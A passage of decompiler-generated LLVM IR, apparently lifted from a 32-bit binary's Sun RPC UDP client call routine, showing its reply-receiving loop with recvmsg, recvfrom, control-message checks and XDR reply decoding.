  %v3_80634f3 = call i32 @ioctl(i32 %stack_var_-9016.3155, i32 %v0_8063493, i32 %stack_var_-9008.2)
  store i32 %v3_80634f3, i32* %eax.global-to-local, align 4
  %v0_80634f8 = load i32, i32* @esp, align 4
  %v1_80634f8 = add i32 %v0_80634f8, 16
  %v2_80634fb = icmp slt i32 %v3_80634f3, 0
  br i1 %v2_80634fb, label %dec_label_pc_806370e, label %dec_label_pc_8063503

dec_label_pc_8063503:                             ; preds = %dec_label_pc_80634d2
  br i1 %v5_8063503, label %dec_label_pc_8063516, label %dec_label_pc_8063509

dec_label_pc_8063509:                             ; preds = %dec_label_pc_8063503
  store i32 %stack_var_-9016.3155, i32* %ecx.global-to-local, align 4
  %v1_806350f = add i32 %stack_var_-9016.3155, 16
  %v2_806350f = inttoptr i32 %v1_806350f to i16*
  %v3_806350f = load i16, i16* %v2_806350f, align 4
  %v12_806350f = icmp eq i16 %v3_806350f, 2
  br i1 %v12_806350f, label %dec_label_pc_8063527, label %dec_label_pc_8063516

dec_label_pc_8063516:                             ; preds = %dec_label_pc_8063509, %dec_label_pc_8063503
  %v4_8063516 = add i32 %stack_var_-9016.3155, 32
  %v0_806351d = load i32, i32* @edi, align 4
  %v1_806351d = add i32 %v0_806351d, -1
  store i32 %v1_806351d, i32* @edi, align 4
  %tmp127 = icmp slt i32 %v1_806351d, 1
  %tmp128 = icmp eq i1 %tmp127, false
  br i1 %tmp128, label %dec_label_pc_80634d2, label %dec_label_pc_806370e

dec_label_pc_8063527:                             ; preds = %dec_label_pc_8063509
  %v0_8063527 = load i32, i32* @esi, align 4
  %v1_8063527 = add i32 %v0_8063527, 28
  %v2_8063527 = inttoptr i32 %v1_8063527 to i32*
  %v3_8063527 = load i32, i32* %v2_8063527, align 4
  store i32 %v3_8063527, i32* @ebx, align 4
  %v5_806352a = add i32 %v3_8063527, %stack_var_-9004.2
  %v1_8063530 = add i32 %v0_8063527, 32
  %v2_8063530 = inttoptr i32 %v1_8063530 to i32*
  %v3_8063530 = load i32, i32* %v2_8063530, align 4
  store i32 %v3_8063530, i32* %eax.global-to-local, align 4
  %v5_8063533 = add i32 %v3_8063530, %stack_var_-9008.2
  %v4_806354b156 = add i32 %v5_8063533, -999999
  %v9_806354b157 = sub i32 999998, %v5_8063533
  %v10_806354b158 = and i32 %v9_806354b157, %v5_8063533
  %v11_806354b159 = icmp slt i32 %v10_806354b158, 0
  %v12_806354b160 = icmp eq i32 %v4_806354b156, 0
  %v13_806354b161 = icmp slt i32 %v4_806354b156, 0
  %v3_8063555162 = icmp eq i1 %v13_806354b161, %v11_806354b159
  %v4_8063555163 = icmp eq i1 %v12_806354b160, false
  %v5_8063555164 = and i1 %v4_8063555163, %v3_8063555162
  br i1 %v5_8063555164, label %dec_label_pc_806353b, label %dec_label_pc_8063557

dec_label_pc_806353b:                             ; preds = %dec_label_pc_8063527, %dec_label_pc_806353b
  %stack_var_-9004.3166 = phi i32 [ %v4_806353b, %dec_label_pc_806353b ], [ %v5_806352a, %dec_label_pc_8063527 ]
  %storemerge7.in165 = phi i32 [ %v4_8063541, %dec_label_pc_806353b ], [ %v5_8063533, %dec_label_pc_8063527 ]
  %v4_806353b = add i32 %stack_var_-9004.3166, 1
  %v4_8063541 = add i32 %storemerge7.in165, -1000000
  %v4_806354b = add i32 %storemerge7.in165, -1999999
  %v9_806354b = sub i32 1999998, %storemerge7.in165
  %v10_806354b = and i32 %v9_806354b, %v4_8063541
  %v11_806354b = icmp slt i32 %v10_806354b, 0
  %v12_806354b = icmp eq i32 %v4_806354b, 0
  %v13_806354b = icmp slt i32 %v4_806354b, 0
  %v3_8063555 = icmp eq i1 %v13_806354b, %v11_806354b
  %v4_8063555 = icmp eq i1 %v12_806354b, false
  %v5_8063555 = and i1 %v4_8063555, %v3_8063555
  br i1 %v5_8063555, label %dec_label_pc_806353b, label %dec_label_pc_8063557

dec_label_pc_8063557:                             ; preds = %dec_label_pc_806353b, %dec_label_pc_8063527
  %storemerge7.in.lcssa = phi i32 [ %v5_8063533, %dec_label_pc_8063527 ], [ %v4_8063541, %dec_label_pc_806353b ]
  %stack_var_-9004.3.lcssa = phi i32 [ %v5_806352a, %dec_label_pc_8063527 ], [ %v4_806353b, %dec_label_pc_806353b ]
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v5_8063563 = icmp slt i32 %stack_var_-9004.3.lcssa, %storemerge3
  br i1 %v5_8063563, label %dec_label_pc_80633ef, label %dec_label_pc_8063569

dec_label_pc_8063569:                             ; preds = %dec_label_pc_8063557
  %v15_806355d = icmp eq i32 %stack_var_-9004.3.lcssa, %storemerge3
  %v1_8063569 = icmp eq i1 %v15_806355d, false
  br i1 %v1_8063569, label %dec_label_pc_806357d, label %dec_label_pc_806356b

dec_label_pc_806356b:                             ; preds = %dec_label_pc_8063569
  store i32 %stack_var_-9000.0, i32* %ecx.global-to-local, align 4
  %v5_8063577 = icmp slt i32 %storemerge7.in.lcssa, %stack_var_-9000.0
  br i1 %v5_8063577, label %dec_label_pc_80633ef, label %dec_label_pc_806357d

dec_label_pc_806357d:                             ; preds = %dec_label_pc_806356b, %dec_label_pc_8063569, %dec_label_pc_8063422.dec_label_pc_806357d_crit_edge
  %v0_8063582 = phi i32 [ %v0_8063582.pre, %dec_label_pc_8063422.dec_label_pc_806357d_crit_edge ], [ %v0_8063527, %dec_label_pc_8063569 ], [ %v0_8063527, %dec_label_pc_806356b ]
  store i32 5, i32* %eax.global-to-local, align 4
  %v1_8063582 = add i32 %v0_8063582, 44
  %v2_8063582 = inttoptr i32 %v1_8063582 to i32*
  store i32 5, i32* %v2_8063582, align 4
  br label %dec_label_pc_80637f9

dec_label_pc_806358e:                             ; preds = %dec_label_pc_8063463
  %v1_806358e = call i32 @__errno_location(i32 %stack_var_-9008.2)
  store i32 %v1_806358e, i32* %eax.global-to-local, align 4
  %v1_8063593 = inttoptr i32 %v1_806358e to i32*
  %v2_8063593 = load i32, i32* %v1_8063593, align 4
  store i32 %v2_8063593, i32* %eax.global-to-local, align 4
  %v1_8063595 = add i32 %v2_8063593, -4
  br label %dec_label_pc_8063705

dec_label_pc_806359d:                             ; preds = %dec_label_pc_8063481
  br i1 %v5_806359d, label %dec_label_pc_80636c7, label %dec_label_pc_80635a7

dec_label_pc_80635a7:                             ; preds = %dec_label_pc_806359d
  store i32 %stack_var_-9028.2, i32* @ebx, align 4
  %v2_80635cf = sub i32 %v1_8063475, %v1_80635cc
  %v1_80635d4 = add i32 %v2_80635cf, 15
  store i32 %v2_80635d1, i32* %stack_var_-8980, align 4
  %v1_80635e1 = and i32 %v1_80635d4, -16
  store i32 %v1_80635e1, i32* %edx.global-to-local, align 4
  %v1_80635ea = add i32 %v1_80635e1, 256
  store i32 %v1_80635ea, i32* @edi, align 4
  %v2_80635f0 = add i32 %v2_80635cf, -4
  %v3_80635f0 = inttoptr i32 %v2_80635f0 to i32*
  store i32 %v2_80635de, i32* %v3_80635f0, align 4
  %v1_80635f1 = add i32 %v2_80635cf, -8
  %v2_80635f1 = inttoptr i32 %v1_80635f1 to i32*
  store i32 8192, i32* %v2_80635f1, align 4
  store i32 %v2_80635f6, i32* %eax.global-to-local, align 4
  %v2_80635ff = add i32 %v2_80635cf, -12
  %v3_80635ff = inttoptr i32 %v2_80635ff to i32*
  store i32 %v2_80635f6, i32* %v3_80635ff, align 4
  %v0_8063600 = load i32, i32* @edi, align 4
  store i32 %v0_8063600, i32* %stack_var_-36, align 4
  %v0_806360d = load i32, i32* %edx.global-to-local, align 4
  %v0_806361d = load i32, i32* @esi, align 4
  %v1_806361d = inttoptr i32 %v0_806361d to i32*
  %v2_806361d = load i32, i32* %v1_806361d, align 4
  %v4_806361d = add i32 %v2_80635cf, -16
  %v5_806361d = inttoptr i32 %v4_806361d to i32*
  store i32 %v2_806361d, i32* %v5_806361d, align 4
  %v0_806361f = load i32, i32* %stack_var_-8980, align 4
  %v3_806361f = call i32 @__libc_recvmsg(i32 %v0_806361f, i32 16, i32 %v2_80635de)
  store i32 %v3_806361f, i32* %eax.global-to-local, align 4
  %v0_8063624 = load i32, i32* @esp, align 4
  %v1_8063624 = add i32 %v0_8063624, 16
  %v2_8063627 = icmp slt i32 %v3_806361f, 0
  store i32 %v3_806361f, i32* @ebx, align 4
  br i1 %v2_8063627, label %dec_label_pc_80636c7, label %dec_label_pc_8063631

dec_label_pc_8063631:                             ; preds = %dec_label_pc_80635a7
  %v2_8063631 = add i32 %v0_8063624, 12
  %v3_8063631 = inttoptr i32 %v2_8063631 to i32*
  store i32 %v3_806361f, i32* %v3_8063631, align 4
  %v0_8063632 = load i32, i32* @ebx, align 4
  %v2_8063632 = add i32 %v0_8063624, 8
  %v3_8063632 = inttoptr i32 %v2_8063632 to i32*
  store i32 %v0_8063632, i32* %v3_8063632, align 4
  %v0_8063633 = load i32, i32* @esi, align 4
  %v1_8063633 = add i32 %v0_8063633, 88
  %v2_8063633 = inttoptr i32 %v1_8063633 to i32*
  %v3_8063633 = load i32, i32* %v2_8063633, align 4
  %v5_8063633 = add i32 %v0_8063624, 4
  %v6_8063633 = inttoptr i32 %v5_8063633 to i32*
  store i32 %v3_8063633, i32* %v6_8063633, align 4
  %v0_8063636 = load i32, i32* @edi, align 4
  %v3_8063636 = inttoptr i32 %v0_8063624 to i32*
  store i32 %v0_8063636, i32* %v3_8063636, align 4
  %v0_8063637 = call i32 @bcmp()
  store i32 %v0_8063637, i32* %eax.global-to-local, align 4
  %v0_806363c = load i32, i32* @esp, align 4
  %v1_806363c = add i32 %v0_806363c, 16
  %v1_806363f = icmp eq i32 %v0_8063637, 0
  %v1_8063641 = icmp eq i1 %v1_806363f, false
  br i1 %v1_8063641, label %dec_label_pc_80636c7, label %dec_label_pc_8063647

dec_label_pc_8063647:                             ; preds = %dec_label_pc_8063631
  br i1 %v5_8063647, label %dec_label_pc_80636c7, label %dec_label_pc_8063650

dec_label_pc_8063650:                             ; preds = %dec_label_pc_8063647
  store i32 16, i32* %eax.global-to-local, align 4
  %v3_8063666 = load i16, i16* %stack_var_-76, align 2
  %v14_8063666 = icmp eq i16 %v3_8063666, 2
  %v1_806366b = icmp eq i1 %v14_8063666, false
  br i1 %v1_806366b, label %dec_label_pc_80636c7, label %dec_label_pc_806366d

dec_label_pc_806366d:                             ; preds = %dec_label_pc_8063650
  %v0_806366d = load i32, i32* @ecx, align 4
  %v2_806366d = add i32 %v0_806363c, 12
  %v3_806366d = inttoptr i32 %v2_806366d to i32*
  store i32 %v0_806366d, i32* %v3_806366d, align 4
  %v1_806366e = add i32 %v0_806363c, 8
  %v2_806366e = inttoptr i32 %v1_806366e to i32*
  store i32 4, i32* %v2_806366e, align 4
  %v0_8063670 = load i32, i32* @esi, align 4
  %v1_8063670 = add i32 %v0_8063670, 12
  %v2_8063673 = add i32 %v0_806363c, 4
  %v3_8063673 = inttoptr i32 %v2_8063673 to i32*
  store i32 %v1_8063670, i32* %v3_8063673, align 4
  store i32 %v2_8063674, i32* %eax.global-to-local, align 4
  %v3_8063677 = inttoptr i32 %v0_806363c to i32*
  store i32 %v2_8063674, i32* %v3_8063677, align 4
  %v0_8063678 = call i32 @bcmp()
  store i32 %v0_8063678, i32* %eax.global-to-local, align 4
  %v0_806367d = load i32, i32* @esp, align 4
  %v1_806367d = add i32 %v0_806367d, 16
  %v1_8063680 = icmp eq i32 %v0_8063678, 0
  %v1_8063682 = icmp eq i1 %v1_8063680, false
  br i1 %v1_8063682, label %dec_label_pc_80636c7, label %dec_label_pc_8063684

dec_label_pc_8063684:                             ; preds = %dec_label_pc_806366d
  %v6_8063684 = and i32 %v0_8063678, -65536
  %v7_8063684 = or i32 %v6_8063684, %v4_8063684
  store i32 %v7_8063684, i32* %eax.global-to-local, align 4
  %v2_8063688 = load i32, i32* @esi, align 4
  %v3_8063688 = add i32 %v2_8063688, 10
  %v4_8063688 = inttoptr i32 %v3_8063688 to i16*
  %v5_8063688 = load i16, i16* %v4_8063688, align 2
  %v16_8063688 = icmp eq i16 %tmp75, %v5_8063688
  %v1_806368c = icmp eq i1 %v16_8063688, false
  br i1 %v1_806368c, label %dec_label_pc_80636c7, label %dec_label_pc_806368e

dec_label_pc_806368e:                             ; preds = %dec_label_pc_8063684
  store i32 %v0_806360d, i32* %eax.global-to-local, align 4
  %v1_80636c334 = icmp eq i32 %v0_806360d, 0
  %v1_80636c541 = icmp eq i1 %v1_80636c334, false
  br i1 %v1_80636c541, label %dec_label_pc_80636a1, label %dec_label_pc_80636c7

dec_label_pc_80636a1:                             ; preds = %dec_label_pc_806368e, %dec_label_pc_80636b1
  %v1_80636b1 = phi i32 [ %v1_80636c0, %dec_label_pc_80636b1 ], [ %v1_806367d, %dec_label_pc_806368e ]
  %v0_8063308 = phi i32 [ %v0_80636bb, %dec_label_pc_80636b1 ], [ %v0_806360d, %dec_label_pc_806368e ]
  %v1_80636a1 = add i32 %v0_8063308, 4
  %v2_80636a1 = inttoptr i32 %v1_80636a1 to i32*
  %v3_80636a1 = load i32, i32* %v2_80636a1, align 4
  %v4_80636a1 = icmp eq i32 %v3_80636a1, 0
  %v1_80636a5 = icmp eq i1 %v4_80636a1, false
  br i1 %v1_80636a5, label %dec_label_pc_80636b1, label %dec_label_pc_80636a7

dec_label_pc_80636a7:                             ; preds = %dec_label_pc_80636a1
  %v1_80636a7 = add i32 %v0_8063308, 8
  %v2_80636a7 = inttoptr i32 %v1_80636a7 to i32*
  %v3_80636a7 = load i32, i32* %v2_80636a7, align 4
  %v12_80636a7 = icmp eq i32 %v3_80636a7, 11
  br i1 %v12_80636a7, label %dec_label_pc_8063308, label %dec_label_pc_80636b1

dec_label_pc_80636b1:                             ; preds = %dec_label_pc_80636a7, %dec_label_pc_80636a1
  %v0_80636b1 = load i32, i32* @edx, align 4
  %v2_80636b1 = add i32 %v1_80636b1, -4
  %v3_80636b1 = inttoptr i32 %v2_80636b1 to i32*
  store i32 %v0_80636b1, i32* %v3_80636b1, align 4
  %v0_80636b2 = load i32, i32* @edx, align 4
  %v2_80636b2 = add i32 %v1_80636b1, -8
  %v3_80636b2 = inttoptr i32 %v2_80636b2 to i32*
  store i32 %v0_80636b2, i32* %v3_80636b2, align 4
  %v0_80636b3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80636b3 = add i32 %v1_80636b1, -12
  %v3_80636b3 = inttoptr i32 %v2_80636b3 to i32*
  store i32 %v0_80636b3, i32* %v3_80636b3, align 4
  store i32 %v2_80635f6, i32* %eax.global-to-local, align 4
  %v2_80636ba = add i32 %v1_80636b1, -16
  %v3_80636ba = inttoptr i32 %v2_80636ba to i32*
  store i32 %v2_80635f6, i32* %v3_80636ba, align 4
  %v0_80636bb = call i32 @__cmsg_nxthdr()
  store i32 %v0_80636bb, i32* %eax.global-to-local, align 4
  %v0_80636c0 = load i32, i32* @esp, align 4
  %v1_80636c0 = add i32 %v0_80636c0, 16
  %v1_80636c3 = icmp eq i32 %v0_80636bb, 0
  %v1_80636c5 = icmp eq i1 %v1_80636c3, false
  br i1 %v1_80636c5, label %dec_label_pc_80636a1, label %dec_label_pc_80636c7

dec_label_pc_80636c7:                             ; preds = %dec_label_pc_8063684, %dec_label_pc_806366d, %dec_label_pc_8063650, %dec_label_pc_8063647, %dec_label_pc_8063631, %dec_label_pc_80635a7, %dec_label_pc_806359d, %dec_label_pc_806368e, %dec_label_pc_80636b1, %dec_label_pc_80636f1.dec_label_pc_80636c7_crit_edge
  %v1_80636c7 = phi i32 [ %v1_80636c7.pre, %dec_label_pc_80636f1.dec_label_pc_80636c7_crit_edge ], [ %v1_806367d, %dec_label_pc_806368e ], [ %v1_806367d, %dec_label_pc_8063684 ], [ %v1_806367d, %dec_label_pc_806366d ], [ %v1_806363c, %dec_label_pc_8063650 ], [ %v1_806363c, %dec_label_pc_8063647 ], [ %v1_806363c, %dec_label_pc_8063631 ], [ %v1_8063624, %dec_label_pc_80635a7 ], [ %v1_8063475, %dec_label_pc_806359d ], [ %v1_80636c0, %dec_label_pc_80636b1 ]
  %v0_80636c7 = phi i32 [ %v1_80636f1, %dec_label_pc_80636f1.dec_label_pc_80636c7_crit_edge ], [ %v0_806360d, %dec_label_pc_806368e ], [ %v7_8063684, %dec_label_pc_8063684 ], [ %v0_8063678, %dec_label_pc_806366d ], [ 16, %dec_label_pc_8063650 ], [ %v0_8063637, %dec_label_pc_8063647 ], [ %v0_8063637, %dec_label_pc_8063631 ], [ %v3_806361f, %dec_label_pc_80635a7 ], [ %v5_8063470, %dec_label_pc_806359d ], [ %v0_80636bb, %dec_label_pc_80636b1 ]
  %v2_80636c7 = add i32 %v1_80636c7, -4
  %v3_80636c7 = inttoptr i32 %v2_80636c7 to i32*
  store i32 %v0_80636c7, i32* %v3_80636c7, align 4
  %v0_80636c8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80636c8 = add i32 %v1_80636c7, -8
  %v3_80636c8 = inttoptr i32 %v2_80636c8 to i32*
  store i32 %v0_80636c8, i32* %v3_80636c8, align 4
  store i32 %v2_80636c9, i32* %eax.global-to-local, align 4
  %v2_80636cc = add i32 %v1_80636c7, -12
  %v3_80636cc = inttoptr i32 %v2_80636cc to i32*
  store i32 %v2_80636c9, i32* %v3_80636cc, align 4
  store i32 %v2_80636cd, i32* %edx.global-to-local, align 4
  %v2_80636d0 = add i32 %v1_80636c7, -16
  %v3_80636d0 = inttoptr i32 %v2_80636d0 to i32*
  store i32 %v2_80636cd, i32* %v3_80636d0, align 4
  %v1_80636d1 = add i32 %v1_80636c7, -20
  %v2_80636d1 = inttoptr i32 %v1_80636d1 to i32*
  store i32 0, i32* %v2_80636d1, align 4
  %v0_80636d3 = load i32, i32* @esi, align 4
  %v1_80636d3 = add i32 %v0_80636d3, 96
  store i32 %v1_80636d3, i32* @ebx, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v1_80636dd = add i32 %v0_80636d3, 92
  %v2_80636dd = inttoptr i32 %v1_80636dd to i32*
  %v3_80636dd = load i32, i32* %v2_80636dd, align 4
  %v5_80636dd = add i32 %v1_80636c7, -24
  %v6_80636dd = inttoptr i32 %v5_80636dd to i32*
  store i32 %v3_80636dd, i32* %v6_80636dd, align 4
  %v0_80636e0 = load i32, i32* @ebx, align 4
  %v2_80636e0 = add i32 %v1_80636c7, -28
  %v3_80636e0 = inttoptr i32 %v2_80636e0 to i32*
  store i32 %v0_80636e0, i32* %v3_80636e0, align 4
  %v0_80636e1 = load i32, i32* @esi, align 4
  %v1_80636e1 = inttoptr i32 %v0_80636e1 to i32*
  %v2_80636e1 = load i32, i32* %v1_80636e1, align 4
  %v4_80636e1 = add i32 %v1_80636c7, -32
  %v5_80636e1 = inttoptr i32 %v4_80636e1 to i32*
  store i32 %v2_80636e1, i32* %v5_80636e1, align 4
  %v0_80636e3 = load i32, i32* %stack_var_-20, align 4
  %v4_80636e3 = load i32, i32* %stack_var_-4, align 4
  %v5_80636e3 = load i32, i32* %stack_var_0, align 4
  %v6_80636e3 = call i32 @__libc_recvfrom(i32 %v0_80636e3, i32 %v0_80632af, i32 %v0_80632ae, i32 %v0_80632ad, i32 %v4_80636e3, i32 %v5_80636e3)
  store i32 %v6_80636e3, i32* %eax.global-to-local, align 4
  %v0_80636e8 = load i32, i32* @esp, align 4
  %v1_80636e8 = add i32 %v0_80636e8, 32
  %v2_80636eb = icmp slt i32 %v6_80636e3, 0
  store i32 %v6_80636e3, i32* @ecx, align 4
  %v1_80636ef = icmp eq i1 %v2_80636eb, false
  br i1 %v1_80636ef, label %dec_label_pc_806371f, label %dec_label_pc_80636f1

dec_label_pc_80636f1:                             ; preds = %dec_label_pc_80636c7
  %v0_80636f1 = load i32, i32* %stack_var_-20, align 4
  %v1_80636f1 = call i32 @__errno_location(i32 %v0_80636f1)
  store i32 %v1_80636f1, i32* %eax.global-to-local, align 4
  %v1_80636f6 = inttoptr i32 %v1_80636f1 to i32*
  %v2_80636f6 = load i32, i32* %v1_80636f6, align 4
  %v11_80636f6 = icmp eq i32 %v2_80636f6, 4
  br i1 %v11_80636f6, label %dec_label_pc_80636f1.dec_label_pc_80636c7_crit_edge, label %dec_label_pc_80636fb

dec_label_pc_80636f1.dec_label_pc_80636c7_crit_edge: ; preds = %dec_label_pc_80636f1
  %v1_80636c7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80636c7

dec_label_pc_80636fb:                             ; preds = %dec_label_pc_80636f1
  %v0_80636fb = load i32, i32* %stack_var_-20, align 4
  %v1_80636fb = call i32 @__errno_location(i32 %v0_80636fb)
  store i32 %v1_80636fb, i32* %eax.global-to-local, align 4
  %v1_8063700 = inttoptr i32 %v1_80636fb to i32*
  %v2_8063700 = load i32, i32* %v1_8063700, align 4
  store i32 %v2_8063700, i32* %eax.global-to-local, align 4
  %v1_8063702 = add i32 %v2_8063700, -11
  br label %dec_label_pc_8063705

dec_label_pc_8063705:                             ; preds = %dec_label_pc_806358e, %dec_label_pc_80636fb
  %v0_806370b72 = phi i32 [ %v2_8063593, %dec_label_pc_806358e ], [ %v2_8063700, %dec_label_pc_80636fb ]
  %storemerge8.in = phi i32 [ %v1_8063595, %dec_label_pc_806358e ], [ %v1_8063702, %dec_label_pc_80636fb ]
  %storemerge8 = icmp eq i32 %storemerge8.in, 0
  br i1 %storemerge8, label %dec_label_pc_8063705.dec_label_pc_8063463.backedge_crit_edge, label %dec_label_pc_806370b

dec_label_pc_8063705.dec_label_pc_8063463.backedge_crit_edge: ; preds = %dec_label_pc_8063705
  %v0_8063463.pre.pre = load i32, i32* @ecx, align 4
  %v1_8063463.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8063463

dec_label_pc_806370b:                             ; preds = %dec_label_pc_8063705, %dec_label_pc_8063308
  %v0_806370b = phi i32 [ %v3_8063308, %dec_label_pc_8063308 ], [ %v0_806370b72, %dec_label_pc_8063705 ]
  %v1_806370b = load i32, i32* @esi, align 4
  %v2_806370b = add i32 %v1_806370b, 48
  %v3_806370b = inttoptr i32 %v2_806370b to i32*
  store i32 %v0_806370b, i32* %v3_806370b, align 4
  br label %dec_label_pc_806370e

dec_label_pc_806370e:                             ; preds = %dec_label_pc_8063489, %dec_label_pc_80634c1, %dec_label_pc_80634d2, %dec_label_pc_8063516, %dec_label_pc_806370b
  store i32 4, i32* %eax.global-to-local, align 4
  %v0_8063713 = load i32, i32* @esi, align 4
  %v1_8063713 = add i32 %v0_8063713, 44
  %v2_8063713 = inttoptr i32 %v1_8063713 to i32*
  store i32 4, i32* %v2_8063713, align 4
  br label %dec_label_pc_80637f9

dec_label_pc_806371f:                             ; preds = %dec_label_pc_80636c7
  %v7_8063722 = icmp sgt i32 %v6_80636e3, 3
  br i1 %v7_8063722, label %dec_label_pc_8063728, label %dec_label_pc_8063463

dec_label_pc_8063728:                             ; preds = %dec_label_pc_806371f
  br i1 %v4_806334a, label %dec_label_pc_806373c, label %dec_label_pc_806372e

dec_label_pc_806372e:                             ; preds = %dec_label_pc_8063728
  %v0_806372e = load i32, i32* @esi, align 4
  %v1_806372e = add i32 %v0_806372e, 88
  %v2_806372e = inttoptr i32 %v1_806372e to i32*
  %v3_806372e = load i32, i32* %v2_806372e, align 4
  store i32 %v3_806372e, i32* %edx.global-to-local, align 4
  %v1_8063731 = add i32 %v0_806372e, 96
  %v2_8063731 = inttoptr i32 %v1_8063731 to i32*
  %v3_8063731 = load i32, i32* %v2_8063731, align 4
  store i32 %v3_8063731, i32* %eax.global-to-local, align 4
  %v2_8063734 = inttoptr i32 %v3_806372e to i32*
  %v3_8063734 = load i32, i32* %v2_8063734, align 4
  %v14_8063734 = icmp eq i32 %v3_8063731, %v3_8063734
  %v1_8063736 = icmp eq i1 %v14_8063734, false
  br i1 %v1_8063736, label %dec_label_pc_8063463, label %dec_label_pc_806373c

dec_label_pc_806373c:                             ; preds = %dec_label_pc_806372e, %dec_label_pc_8063728
  %v1_806373c = add i32 %v0_80636e8, 28
  %v2_806373c = inttoptr i32 %v1_806373c to i32*
  store i32 1, i32* %v2_806373c, align 4
  %v0_806373e = load i32, i32* @ecx, align 4
  %v2_806373e = add i32 %v0_80636e8, 24
  %v3_806373e = inttoptr i32 %v2_806373e to i32*
  store i32 %v0_806373e, i32* %v3_806373e, align 4
  %v0_806373f = load i32, i32* @ebx, align 4
  %v2_806373f = add i32 %v0_80636e8, 20
  %v3_806373f = inttoptr i32 %v2_806373f to i32*
  store i32 %v0_806373f, i32* %v3_806373f, align 4
  store i32 %v2_8063740, i32* @ebx, align 4
  %v2_8063743 = add i32 %v0_80636e8, 16
  %v3_8063743 = inttoptr i32 %v2_8063743 to i32*
  store i32 %v2_8063740, i32* %v3_8063743, align 4
  %v0_8063744 = load i32, i32* %stack_var_-20, align 4
  %v4_8063744 = inttoptr i32 %v0_8063744 to i32*
  %v5_8063744 = call i32 @__GI_xdrmem_create(i32* %v4_8063744, i32 %v0_80632af, i32 %v0_80632ae, i32 %v0_80632ad)
  store i32 %v5_8063744, i32* %eax.global-to-local, align 4
  %v0_8063749 = load i32, i32* @esp, align 4
  %v1_8063749 = inttoptr i32 %v0_8063749 to i32*
  %v3_8063749 = add i32 %v0_8063749, 4
  store i32 %v2_806374a, i32* @edi, align 4
  %v1_8063750 = inttoptr i32 %v3_8063749 to i32*
  %v2_8063750 = load i32, i32* %v1_8063750, align 4
  store i32 %v2_8063750, i32* @eax, align 4
  store i32 %v2_806374a, i32* %v1_8063750, align 4
  store i32 %v2_8063740, i32* %v1_8063749, align 4
  %v0_8063753 = call i32 @__GI_xdr_replymsg()
  store i32 %v0_8063753, i32* %eax.global-to-local, align 4
  %v0_8063758 = load i32, i32* @esp, align 4
  %v1_806375b = icmp eq i32 %v0_8063753, 0
  br i1 %v1_806375b, label %dec_label_pc_80637ef, label %dec_label_pc_8063763

dec_label_pc_8063763:                             ; preds = %dec_label_pc_806373c
  %v0_8063763 = load i32, i32* @ecx, align 4
  %v2_8063763 = add i32 %v0_8063758, 12
  %v3_8063763 = inttoptr i32 %v2_8063763 to i32*
  store i32 %v0_8063763, i32* %v3_8063763, align 4
  %v0_8063764 = load i32, i32* @ecx, align 4
  %v2_8063764 = add i32 %v0_8063758, 8
  %v3_8063764 = inttoptr i32 %v2_8063764 to i32*
  store i32 %v0_8063764, i32* %v3_8063764, align 4
  %v0_8063765 = load i32, i32* @esi, align 4
  %v1_8063765 = add i32 %v0_8063765, 44
  store i32 %v1_8063765, i32* %eax.global-to-local, align 4
  %v2_8063768 = add i32 %v0_8063758, 4
  %v3_8063768 = inttoptr i32 %v2_8063768 to i32*
  store i32 %v1_8063765, i32* %v3_8063768, align 4
  %v3_8063769 = inttoptr i32 %v0_8063758 to i32*
  store i32 %v2_806374a, i32* %v3_8063769, align 4
  %v0_806376a = call i32 @__GI__seterr_reply()
  store i32 %v0_806376a, i32* %eax.global-to-local, align 4
  %v0_806376f = load i32, i32* @esp, align 4
  %v0_8063772 = load i32, i32* @esi, align 4
  %v1_8063772 = add i32 %v0_8063772, 44
  %v2_8063772 = inttoptr i32 %v1_8063772 to i32*
  %v3_8063772 = load i32, i32* %v2_8063772, align 4
  %v4_8063772 = icmp eq i32 %v3_8063772, 0
  %v1_8063776 = icmp eq i1 %v4_8063772, false
  br i1 %v1_8063776, label %dec_label_pc_80637c5, label %dec_label_pc_8063778

dec_label_pc_8063778:                             ; preds = %dec_label_pc_8063763
  store i32 %tmp107, i32* %edx.global-to-local, align 4
  store i32 %v2_8063437, i32* @ebx, align 4
  %v2_8063781 = load i32, i32* %arg1, align 4
  store i32 %v2_8063781, i32* %eax.global-to-local, align 4
  %v2_8063783 = add i32 %v0_806376f, 12
  %v3_8063783 = inttoptr i32 %v2_8063783 to i32*
  store i32 %tmp107, i32* %v3_8063783, align 4
  %v0_8063784 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063784 = add i32 %v0_806376f, 8
  %v3_8063784 = inttoptr i32 %v2_8063784 to i32*
  store i32 %v0_8063784, i32* %v3_8063784, align 4
  %v1_8063785 = add i32 %v2_8063781, 32
  %v2_8063785 = inttoptr i32 %v1_8063785 to i32*
  %v3_8063785 = load i32, i32* %v2_8063785, align 4
  store i32 %v3_8063785, i32* %edx.global-to-local, align 4
  %v2_8063788 = add i32 %v0_806376f, 4
  %v3_8063788 = inttoptr i32 %v2_8063788 to i32*
  store i32 %v2_8063437, i32* %v3_8063788, align 4
  %v3_8063789 = inttoptr i32 %v0_806376f to i32*
  store i32 %v2_8063781, i32* %v3_8063789, align 4
  %v1_806378a = add i32 %v0_806376f, -4
  %v2_806378a = inttoptr i32 %v1_806378a to i32*
  store i32 134625165, i32* %v2_806378a, align 4
  %v3_806378a = load i32, i32* %edx.global-to-local, align 4
  %v4_806378a = add i32 %v3_806378a, 8
  %v5_806378a = inttoptr i32 %v4_806378a to i32*
  %v6_806378a = load i32, i32* %v5_806378a, align 4
  call void @__pseudo_call(i32 %v6_806378a)
  %v1_8063790 = icmp eq i32 %v2_8063781, 0
  %v1_8063792 = icmp eq i1 %v1_8063790, false
  br i1 %v1_8063792, label %dec_label_pc_80637a2, label %dec_label_pc_8063794

dec_label_pc_8063794:                             ; preds = %dec_label_pc_8063778
  %v0_8063794 = load i32, i32* @esi, align 4
  %v1_8063794 = add i32 %v0_8063794, 44
  %v2_8063794 = inttoptr i32 %v1_8063794 to i32*
  store i32 7, i32* %v2_8063794, align 4
  %v0_806379b = load i32, i32* @esi, align 4
  %v1_806379b = add i32 %v0_806379b, 48
  %v2_806379b = inttoptr i32 %v1_806379b to i32*
  store i32 6, i32* %v2_806379b, align 4
  br label %dec_label_pc_80637a2

dec_label_pc_80637a2:                             ; preds = %dec_label_pc_8063778, %dec_label_pc_8063794
